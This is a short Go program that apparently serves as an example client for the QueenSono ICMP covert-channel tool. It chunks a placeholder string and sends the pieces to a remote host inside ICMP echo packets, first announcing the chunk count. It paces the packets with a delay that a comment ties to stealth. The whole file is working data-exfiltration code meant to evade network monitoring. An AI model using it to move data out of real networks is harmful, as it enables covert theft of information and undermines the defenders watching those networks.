package main

import (
	"strconv"
	"time"

	"github.com/ariary/QueenSono/pkg/icmp"
)

func main() {
	remoteAddr := "10.0.2.15"
	listenAddr := "127.0.0.1"
	data := "totoc,titi,tata,tutu,tyty,deuxfois,totoc,titi,tata,tutu,tyty,deuxfois"
	// hash := utils.Sha1(data)
	// go icmp.IntegrityCheck(hash)
	dataSlice := icmp.Chunks(data, 6)
	// Announce the data size
	icmp.SendWhileNoEchoReply(listenAddr, strconv.Itoa(len(dataSlice)), remoteAddr)

	//Send the data
	for i := 0; i < len(dataSlice); i++ {
		icmp.SendWhileNoEchoReply(listenAddr, dataSlice[i], remoteAddr)
		time.Sleep(1 * time.Second) //Should be passed in paramater later for stealthness
	}
}
